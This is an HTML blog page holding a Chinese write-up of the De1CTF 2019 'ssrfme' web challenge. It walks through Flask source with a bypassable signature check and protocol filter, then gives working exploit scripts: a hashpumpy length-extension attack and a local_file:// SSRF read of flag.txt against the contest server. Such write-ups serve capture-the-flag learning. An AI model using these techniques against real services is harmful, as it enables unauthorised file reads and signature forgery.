@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>De1ctf | Hexo</title>
+  <meta name="keywords" content=" RSA , ssrf ">
+  <meta name="description" content="De1ctf | Hexo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="redis协议分析tcpdump抓包 tcpdump -i lo port 6379 -w redis.pcap在redis执行如下命令 127.0.0.1:6379&amp;gt; set name test OK 127.0.0.1:6379&amp;gt; get name &amp;quot;test&amp;quot; 127.0.0.1:6379&amp;gt; RESP协议RESP在Redis中用作请求-响应协议的方式">
+<meta name="keywords" content="ssrf,redis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis与ssrf">
+<meta property="og:url" content="https://github.com/BrainLyh/2019/08/10/redis/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="redis协议分析tcpdump抓包 tcpdump -i lo port 6379 -w redis.pcap在redis执行如下命令 127.0.0.1:6379&amp;gt; set name test OK 127.0.0.1:6379&amp;gt; get name &amp;quot;test&amp;quot; 127.0.0.1:6379&amp;gt; RESP协议RESP在Redis中用作请求-响应协议的方式">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg">
+<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg">
+<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg">
+<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png">
+<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg">
+<meta property="og:updated_time" content="2019-08-10T07:48:03.441Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="redis与ssrf">
+<meta name="twitter:description" content="redis协议分析tcpdump抓包 tcpdump -i lo port 6379 -w redis.pcap在redis执行如下命令 127.0.0.1:6379&amp;gt; set name test OK 127.0.0.1:6379&amp;gt; get name &amp;quot;test&amp;quot; 127.0.0.1:6379&amp;gt; RESP协议RESP在Redis中用作请求-响应协议的方式">
+<meta name="twitter:image" content="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/gruvbox-dark.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Luc1fer</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/BrainLyh" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:brainsemail@163.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=12128&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="neteasemusic" href="https://music.163.com/#/user/home?id=125977062" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-neteasemusic"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(23)</small></div></li>
+    
+        
+            
+            <li><div data-rel="ctf">ctf<small>(13)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="比赛回顾">比赛回顾<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="WP">WP<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="wp">wp<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="渗透测试">渗透测试<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="docker">docker<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="23">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://www.gtfly.top/">gtfly</a></li>
+            
+            <li><a target="_blank" href="https://www.leavesongs.com/">P神</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">命令执行</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">比赛回顾</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">WP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">弱类型</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">RSA</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">ssrf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">mysql load data</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">LSB</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">MISC</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">隐写</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">工具</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">渗透测试</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">redis</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">Xdebuf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">SQL</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">serialize</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">哈希长度扩展攻击</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">zip</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">misc</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="ctf "
+           href="/2019/03/23/Command-Execution/"
+           data-tag="php,命令执行"
+           data-author="" >
+            <span class="post-title" title="命令执行漏洞(Command Execution)">命令执行漏洞(Command Execution)</span>
+            <span class="post-date" title="2019-03-23 15:13:47">2019/03/23</span>
+        </a>
+        
+        <a  class="比赛回顾 "
+           href="/2018/07/22/ISCC线下赛回顾/"
+           data-tag="比赛回顾"
+           data-author="" >
+            <span class="post-title" title="2019 ISCC线下赛回顾">2019 ISCC线下赛回顾</span>
+            <span class="post-date" title="2018-07-22 15:00:00">2018/07/22</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2018/03/23/CSAW CTF 2016 mfw Writeup/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="CSAW CTF 2016 mfw Writeup">CSAW CTF 2016 mfw Writeup</span>
+            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/19/Black_magic/"
+           data-tag="php,弱类型"
+           data-author="" >
+            <span class="post-title" title="black_magic">black_magic</span>
+            <span class="post-date" title="2019-08-19 18:59:50">2019/08/19</span>
+        </a>
+        
+        <a  class="wp "
+           href="/2019/08/16/De1ctf/"
+           data-tag="RSA,ssrf"
+           data-author="" >
+            <span class="post-title" title="De1ctf">De1ctf</span>
+            <span class="post-date" title="2019-08-16 20:00:50">2019/08/16</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/07/MySQL LOAD DATA/"
+           data-tag="mysql load data"
+           data-author="" >
+            <span class="post-title" title="MYSQL LOAD DATA">MYSQL LOAD DATA</span>
+            <span class="post-date" title="2019-08-07 22:14:02">2019/08/07</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2017/03/23/HackLu Flatscience WP/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="HackLu FlatScience WP">HackLu FlatScience WP</span>
+            <span class="post-date" title="2017-03-23 15:13:47">2017/03/23</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2018/03/23/LSB隐写/"
+           data-tag="LSB,MISC,隐写"
+           data-author="" >
+            <span class="post-title" title="LSB图片隐写">LSB图片隐写</span>
+            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/2018/02/23/Nessus使用指南/"
+           data-tag="工具,渗透测试"
+           data-author="" >
+            <span class="post-title" title="Nessus 使用指南">Nessus 使用指南</span>
+            <span class="post-date" title="2018-02-23 15:13:47">2018/02/23</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/16/SSRF/"
+           data-tag="ssrf,redis"
+           data-author="" >
+            <span class="post-title" title="redis与ssrf">redis与ssrf</span>
+            <span class="post-date" title="2019-08-16 16:11:22">2019/08/16</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/17/Xdebug/"
+           data-tag="Xdebuf,ctf"
+           data-author="" >
+            <span class="post-title" title="Xdebug">Xdebug</span>
+            <span class="post-date" title="2019-08-17 23:23:45">2019/08/17</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/02/SQL入门/"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="SQL入门">SQL入门</span>
+            <span class="post-date" title="2019-08-02 09:43:50">2019/08/02</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2019/07/26/peaCTF-WP/"
+           data-tag="WP,RSA"
+           data-author="" >
+            <span class="post-title" title="peaCTF WP">peaCTF WP</span>
+            <span class="post-date" title="2019-07-26 15:13:47">2019/07/26</span>
+        </a>
+        
+        <a  class="docker "
+           href="/2019/08/02/ubuntu配置docker/"
+           data-tag="docker"
+           data-author="" >
+            <span class="post-title" title="Ubuntu 16.04 配置docker">Ubuntu 16.04 配置docker</span>
+            <span class="post-date" title="2019-08-02 16:15:29">2019/08/02</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/10/redis/"
+           data-tag="ssrf,redis"
+           data-author="" >
+            <span class="post-title" title="redis与ssrf">redis与ssrf</span>
+            <span class="post-date" title="2019-08-10 15:44:26">2019/08/10</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/2018/03/23/渗透测试-信息收集/"
+           data-tag="渗透测试"
+           data-author="" >
+            <span class="post-title" title="渗透测试-信息收集">渗透测试-信息收集</span>
+            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/03/23/序列化与反序列化/"
+           data-tag="php,serialize"
+           data-author="" >
+            <span class="post-title" title="序列化与反序列化">序列化与反序列化</span>
+            <span class="post-date" title="2019-03-23 15:13:47">2019/03/23</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2018/03/23/HITCON-Babytrick/"
+           data-tag="WP,SQL,serialize"
+           data-author="" >
+            <span class="post-title" title="HITCON-babytrick">HITCON-babytrick</span>
+            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2019/08/01/JarvisOJ/"
+           data-tag="WP,SQL,serialize,哈希长度扩展攻击"
+           data-author="" >
+            <span class="post-title" title="JarvisOJ WP">JarvisOJ WP</span>
+            <span class="post-date" title="2019-08-01 19:37:28">2019/08/01</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2018/05/23/RSA/"
+           data-tag="RSA"
+           data-author="" >
+            <span class="post-title" title="RSA">RSA</span>
+            <span class="post-date" title="2018-05-23 15:13:47">2018/05/23</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/03/23/ZIP伪加密/"
+           data-tag="zip,misc"
+           data-author="" >
+            <span class="post-title" title="ZIP&#39;s things">ZIP&#39;s things</span>
+            <span class="post-date" title="2019-03-23 15:13:47">2019/03/23</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/01/session_unserialize/"
+           data-tag="php,serialize"
+           data-author="" >
+            <span class="post-title" title="Session_unserlize">Session_unserlize</span>
+            <span class="post-date" title="2019-08-01 19:33:07">2019/08/01</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/07/28/SQL/"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="SQL">SQL</span>
+            <span class="post-date" title="2019-07-28 15:13:47">2019/07/28</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-De1ctf" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">De1ctf</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" data-rel="wp">wp</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color4">RSA</a>
+            
+            <a href="javascript:" class="color5">ssrf</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-08-19 19:18:31'>2019-08-16 20:00</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#De1ctf-2019-WP"><span class="toc-text">De1ctf 2019 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrfme"><span class="toc-text">ssrfme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码分析"><span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编写脚本"><span class="toc-text">编写脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#another-way"><span class="toc-text">another way</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="De1ctf-2019-WP"><a href="#De1ctf-2019-WP" class="headerlink" title="De1ctf 2019 WP"></a>De1ctf 2019 WP</h1><h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><p>源码 </p>
+<pre><code>#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding(&#39;latin1&#39;)
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result[&#39;code&#39;] = 500
+        if (self.checkSign()):
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
+                resp = scan(self.param)
+                if (resp == &quot;Connection Timeout&quot;):
+                    result[&#39;data&#39;] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result[&#39;code&#39;] = 200
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
+                result[&#39;code&#39;] = 200
+                result[&#39;data&#39;] = f.read()
+            if result[&#39;code&#39;] == 500:
+                result[&#39;data&#39;] = &quot;Action Error&quot;
+        else:
+            result[&#39;code&#39;] = 500
+            result[&#39;msg&#39;] = &quot;Sign Error&quot;
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+
+#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+
+
+@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route(&#39;/&#39;)
+def index():
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;
+
+
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+        return True
+    else:
+        return False
+
+
+if __name__ == &#39;__main__&#39;:
+    app.debug = False
+    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><code>Exec()</code>函数首先调用<code>checkSign()</code>进行md5校验，我们可以通过长度扩展攻击绕过。接下来对scan行为进行打开文本文件，调用<code>scan()</code>读取内容，然后将目标文件内容写入文件。对read行为进行刚刚写入文件的读取。</p>
+<pre><code>def Exec(self):
+    result = {}
+    result[&#39;code&#39;] = 500
+    if (self.checkSign()):
+        if &quot;scan&quot; in self.action:
+            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
+            resp = scan(self.param)
+            if (resp == &quot;Connection Timeout&quot;):
+                result[&#39;data&#39;] = resp
+            else:
+                print resp
+                tmpfile.write(resp)
+                tmpfile.close()
+            result[&#39;code&#39;] = 200
+        if &quot;read&quot; in self.action:
+            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
+            result[&#39;code&#39;] = 200
+            result[&#39;data&#39;] = f.read()
+        if result[&#39;code&#39;] == 500:
+            result[&#39;data&#39;] = &quot;Action Error&quot;
+    else:
+        result[&#39;code&#39;] = 500
+        result[&#39;msg&#39;] = &quot;Sign Error&quot;
+    return result
+
+def checkSign(self):
+    if (getSign(self.action, self.param) == self.sign):
+        return True
+    else:
+        return False</code></pre><p><code>/geneSign</code>路由负责生成Sign。同时<code>action</code>被限定为<code>scan</code></p>
+<pre><code>#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)</code></pre><p><code>/De1ta</code>路由对请求的<code>param</code>参数进行检查，然后通过对<code>Task</code>类传入相应参数打印<code>Exec()</code>函数的结果</p>
+<pre><code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>函数打开<code>param</code>指向的内容进行读取，这是我们利用<code>ssrf</code>的点。</p>
+<pre><code>def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;</code></pre><p>getSign()函数对<code>secerty_key,param,action</code>进行md5加密。</p>
+<pre><code>def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>代码的逻辑大体上是</p>
+<pre><code>初始化各个参数-&gt;进入Task类-&gt;执行Exec()函数-&gt;检查md5值-&gt;对参数中的action进行不同操作-&gt;dump函数执行结果</code></pre><p>我们可以通过长度扩展攻击绕过长度判断，根据提示flag在<code>/flag.txt</code>，我们可以读取这个文件，但是<code>waf()</code>对<code>gopher</code>和<code>file</code>进行过滤，我们无法利用这两个协议，根据CVE-2019-9948(urllib)<a href="https://www.cvedetails.com/cve/CVE-2019-9948/" title="CVE-2019-9948" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9948/</a>我们可以通过<code>local_file:///flag.txt</code>来绕过waf。</p>
+<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><pre><code>import urllib,hashpumpy 
+import requests
+
+&quot;&quot;&quot;
+    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)
+
+    Arguments:
+        hexdigest(str):      Hex-encoded result of hashing key + original_data.
+        original_data(str):  Known data used to get the hash result hexdigest.
+        data_to_add(str):    Data to append
+        key_length(int):     Length of unknown data prepended to the hash
+
+    Returns:
+        A tuple containing the new hex digest and the new message.
+
+&quot;&quot;&quot;
+
+url = &quot;http://139.180.128.86/&quot;
+
+#get the Sign of Scan
+geneSign = &quot;geneSign?&quot;
+payload = &quot;local_file:flag.txt&quot;
+re = requests.get(url+geneSign+&quot;param=&quot;+payload).text
+print re
+
+#hash extend attack
+hashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)
+print hashs
+action = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;
+cookie = {
+    #&quot;action&quot;:urllib.quote(hashextend),
+    &quot;action&quot;:action,    
+    &quot;sign&quot;:hashs
+}
+print cookie
+
+
+re2 = requests.get(url+&#39;De1ta?&#39;+&quot;param=&quot;+payload,cookies=cookie)
+
+print re2.content</code></pre><p>在使用扩展攻击的时候我们需要把所得签名前面的信息去掉</p>
+<pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ce
+Input Data: local_file:flag.txtscan
+Input Key Length: 16
+Input Data to Add: read
+636d649a50e61e75436cc1ba50d5a003
+local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</code></pre><h3 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h3><p>在ctf time上看到的回答，分析的好细致<a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a>。这里提供了另一种思路</p>
+<blockquote>
+<p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including “read”. If we can generate a sign for the action as “readscan”, we can perform the scan and read the result in one go.</p>
+<p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as “flag.txtread” (the value of action will be “scan”) and generate the same hash as if we pass param as “flag.txt” and action as “readscan”.</p>
+<p>“flag.txtread”+”scan” == “flag.txt”+”readscan”</p>
+<p>You could also use a length extension attack, but this way is more simple.</p>
+<p>So our exploit is complete.</p>
+</blockquote>
+<p>这是他们编写的脚本：膜</p>
+<pre><code>import requests
+
+def geneSign(param):
+    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).text
+
+realParam = &quot;flag.txt&quot;
+
+param = realParam+&quot;read&quot;
+sign = geneSign(param)
+param = realParam
+
+action = &quot;readscan&quot;
+
+answer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).text
+
+print(answer)</code></pre>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 brainsemail@163.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>De1ctf</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-08-16, 20:00:50</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-19, 19:18:31</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/16/De1ctf/" title="De1ctf">https://github.com/BrainLyh/2019/08/16/De1ctf/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2016-2019 Yelog</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="//cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
